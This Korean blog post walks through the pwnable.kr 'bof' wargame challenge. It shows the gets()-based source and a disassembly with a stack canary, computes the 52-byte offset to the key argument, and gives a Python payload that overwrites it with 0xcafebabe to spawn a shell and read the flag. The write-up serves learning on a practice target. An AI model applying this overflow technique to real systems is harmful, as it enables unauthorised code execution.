---
title: "pwnable.kr [Toddler's Bottle] bof 풀이 — 스택 버퍼 오버플로우로 지역변수 덮어쓰기"
description: "pwnable.kr bof 문제를 REA로 정적 분석해 overflowme 버퍼부터 key 인자까지의 오프셋을 확정하고, 스택 카나리가 있음에도 익스플로잇이 성립하는 이유와 원격 풀이 과정을 기록한다."
date: 2026-10-16
category: Security
tags: [pwnable.kr, pwn, wargame, buffer-overflow, stack-canary, reverse-engineering]
---

[pwnable.kr](https://pwnable.kr) **Toddler's Bottle** 세 번째 문제 `bof`.
`gets()`로 생긴 전형적인 **스택 버퍼 오버플로우**로, 스택 위의 지역/인자 값을 덮어써서 분기를 바꾸는 문제다.
[fd](/LeJus-Blog/posts/2026-10-16-pwnable-kr-fd/) · [collision](/LeJus-Blog/posts/2026-10-16-pwnable-kr-collision/)에 이어
바이너리를 REA로 분석해 **오프셋을 바이너리 수준에서 확정**하고 원격에서 셸을 땄다.

![pwnable.kr bof 문제 페이지](/LeJus-Blog/images/bof-challenge.jpg)

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 카테고리 | Toddler's Bottle |
| 배점 | 5 pt |
| 접속 | `nc pwnable.kr 10003` (bof 바이너리가 직접 실행됨) |
| 설명 | *Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?* |

fd·collision과 달리, 원격은 래퍼 셸이 아니라 **`bof` 바이너리를 직접 실행**한다
(`socat TCP-LISTEN:10003,fork EXEC:bof`). 접속하면 바로 `overflow me : ` 프롬프트가 뜬다.

## 2. 소스 코드

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);		// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

- `main`은 `func(0xdeadbeef)`를 호출한다 → 인자 `key`의 초기값은 `0xdeadbeef`.
- `func`는 32바이트 버퍼 `overflowme`에 **`gets()`** 로 입력을 받는다 → **길이 제한이 없다**.
- `key == 0xcafebabe` 이면 셸을 준다.

즉 `overflowme`를 넘치게 입력해서, 스택 위에 있는 **인자 `key`를 `0xcafebabe`로 덮어쓰면** 된다.

## 3. REA 정적 분석 — 오프셋 확정 + 카나리 발견

REA(Hopper)로 `func`를 분석하자 소스에는 안 보이던 **스택 카나리**가 드러났다.

```nasm
0x1202: sub  esp, 0x30
0x1210: mov  eax, dword [gs:0x14]     ; ← 스택 카나리 로드
0x1216: mov  dword [ebp+var_C], eax   ;   ebp-0xC 에 저장
...
0x1230: lea  eax, dword [ebp+var_2C]  ; &overflowme  (ebp-0x2C)
0x1234: call sub_1060                 ; gets(overflowme)
...
0x123c: cmp  dword [ebp+arg_0], 0xcafebabe  ; key (ebp+0x8) == 0xcafebabe ?
0x1243: jne  loc_1272
0x1245: ... setregid(getegid(), getegid())
0x1261: lea  eax, [ebx-0x4000+aBinsh] ; "/bin/sh"
0x1268: call sub_10a0                 ; system("/bin/sh")
...
; 함수 에필로그(= 분기 이후)에서야 카나리 검사
0x1285: mov  eax, dword [ebp+var_C]
0x1288: sub  eax, dword [gs:0x14]
0x128f: je   loc_1296
0x1291: call __stack_chk_fail_local
```

스택 배치(낮은 주소 → 높은 주소):

```
[ ebp-0x2C ] overflowme[32]   ← gets() 입력 시작
[ ebp-0x0C ] stack canary
[ ebp-0x08 ] saved ebx
[ ebp-0x04 ] saved esi
[ ebp+0x00 ] saved ebp
[ ebp+0x04 ] return address
[ ebp+0x08 ] key  ← 0xcafebabe 로 덮을 대상
```

**버퍼 시작(ebp-0x2C) → key(ebp+0x8) 까지의 거리:**

```
(ebp+0x08) - (ebp-0x2C) = 0x34 = 52 바이트
```

→ `"A" × 52 + "\xbe\xba\xfe\xca"` (0xcafebabe, 리틀 엔디언).

### 카나리가 있는데 왜 뚫리나?

핵심 포인트다. `key`를 덮으려면 그 사이에 있는 **카나리까지 반드시 덮게** 된다.
보통 카나리를 건드리면 `__stack_chk_fail`로 프로그램이 죽는다. 그런데 이 문제는:

- 승리 조건 **`system("/bin/sh")` 가 함수 *본문* 안에서 실행**된다.
- 카나리 검사는 함수 **에필로그(= 분기 판정 *이후*)** 에 있다.

따라서 **셸을 먼저 얻고**, 카나리 검사는 그 뒤(셸 종료 후)에나 돌아온다.
즉 "셸만 따면 끝"인 이 문제에서는 **카나리가 익스플로잇을 막지 못한다.**
(만약 `return` 이후로 제어 흐름을 가져가는 ROP가 목표였다면 카나리 우회가 필요했을 것이다.)

## 4. 원격 풀이와 함정 하나

`gets()`로 페이로드를 보내 `key`를 덮으면 `system("/bin/sh")`가 뜬다.
그런데 실제로 풀 때 **셸은 떴지만 `cat flag`가 먹히지 않는 현상**을 만났다.

```
overflow me : /bin/sh: 0: can't access tty; job control turned off
$            ← 셸은 떴는데, 이후 보낸 명령이 실행되지 않음
```

원인은 입력 타이밍이었다. 원격 PTY(`setsid`, `echo=0`) 구성에서,
**셸이 시작된 *뒤*에 도착한 입력이 셸의 stdin으로 전달되지 않았다.**
해결책은 간단하다 — **페이로드와 명령을 한 번에 전송**해서,
`gets()`가 첫 줄(페이로드)을 읽고 나면 **남은 명령이 PTY 버퍼에 이미 들어 있도록** 하는 것.

```python
# 페이로드 + 명령을 한 번의 send로 전송 → PTY 버퍼에 미리 적재
payload = b"A"*52 + b"\xbe\xba\xfe\xca" + b"\n"
sock.sendall(payload + b"cat flag\n")
# gets() 가 payload 줄을 소비 → system("/bin/sh") → 셸이 남은 "cat flag" 를 읽어 실행
```

수신 로그(raw):

```
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ <플래그 출력 — 공개 글에서는 가림>
```

> 셸을 얻어 `bof_pwn` 권한으로 플래그를 읽어 문제를 해결했다. 값은 가린다 —
> pwnable.kr의 **Submit flag** 에 직접 입력하면 점수가 올라간다.

## 5. 정리

- `bof`의 본질은 `gets()`로 **스택 지역/인자 값을 덮어써 분기를 조작**하는 것.
- REA로 `overflowme(ebp-0x2C) → key(ebp+0x8) = 52바이트` 오프셋을 **바이너리에서 확정**했다.
- 소스엔 없던 **스택 카나리**가 있었지만, 승리 지점이 에필로그보다 앞서 실행되므로 익스플로잇은 성립했다.
- 원격 PTY에서는 **페이로드와 후속 명령을 한 번에 보내** 입력 전달 타이밍 문제를 피했다.

> 보호기법(카나리)이 "있다/없다"가 아니라, **보호가 실제로 작동하는 지점**을 읽는 것이 핵심이다.
> 다음은 `flag` — 패킹된 바이너리 언패킹으로 이어진다.
